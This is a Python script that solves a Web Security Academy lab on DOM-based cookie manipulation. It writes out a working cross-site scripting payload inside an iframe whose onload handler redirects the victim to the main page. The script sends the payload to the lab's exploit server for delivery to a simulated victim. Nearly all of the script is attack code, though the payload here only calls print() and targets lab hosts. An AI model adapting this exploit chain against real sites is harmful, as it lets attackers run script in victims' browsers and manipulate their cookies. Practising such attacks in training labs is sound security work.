######################################################################
#
# Lab: DOM-based cookie manipulation
#
# Hack Steps:
#      1. Craft an iframe with the XSS payload in its src attribute
#         and make its onload handler redirect the victim to
#         the main page, triggering the XSS payload
#      2. Deliver the exploit to the victim
#
######################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a09007904c6e09780083a1300e3001b.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0adb00bc04b2e0f2801639bc01d30050.exploit-server.net"

def main():
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    xss_payload = "&'><img src=1 onerror=print()>"
    payload = f"""<iframe src="{LAB_URL}/product?productId=2{xss_payload}" onload="if(!window.x)this.src='{LAB_URL}';window.x=1;" >"""
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    try:
        requests.post(EXPLOIT_SERVER_URL, data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()


